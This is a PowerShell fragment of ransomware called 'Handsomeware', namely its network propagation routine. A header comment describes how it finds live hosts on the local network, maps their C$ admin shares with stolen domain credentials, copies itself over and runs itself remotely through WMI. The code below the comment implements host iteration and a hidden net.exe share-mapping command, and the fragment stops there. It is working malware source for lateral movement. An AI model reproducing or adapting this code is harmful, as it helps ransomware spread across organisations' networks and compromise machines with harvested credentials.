    <# 
Network Propagation:
Handsomeware has network propagation functionality which allows it to infect other machines in local network. 
First, it retrieves IP addresses in the victim’s network using the PowerShell Get-NetNeighbor cmdlet and Get-NetworkRange() function. 
With each retrieved IP address it sends ping requests using SendPingAsync() function to create list of alive IPs. 
For each alive host IP it checks if an SMB share is present or not. 
If present, Handsomeware tries to map C$ (Window admin share) using the “net use” command. 
If command runs more than seven seconds it kills the net.exe process. 
After successfully mapping it copies itself over network share and executes using Powershell.exe. 
To execute PowerShell on a remote host it uses the Invoke-WmiMethod cmdlet.   #>

foreach ($hostip in $arrAliveIPs)
{
    if (getAliveSmb ($hostip) -eq $True)
    {
        if ($hostip -eq $strMyIp) { continue } #Skip self
        Write-host "Host:" $hostip "is alive, tryingg to copy myself on remote host"
        Write-host "Connecting to:" $hostip "on c$..."
        $strNetExePath = $env:windir + "\system32\net.exe"
        $strNetExeArgs = " use \\" + $hostip + "\\c$ /USER:" + $strDomain + "\" + $strUsername + " " + $strPassword
        $strNetClean = $strNetExePath + " use \\" + $hostip + "\c$ /DELETE /y"

        $p = New-Object System.Diagnostics.Process
        $p.StartInfo.WindowStyle = "Hidden"
        $p.StartInfo.FileName = $strNetExePath
        $p.StartInfo.Arguments = $strNetExeArgs
        $p.Start()
    }
}
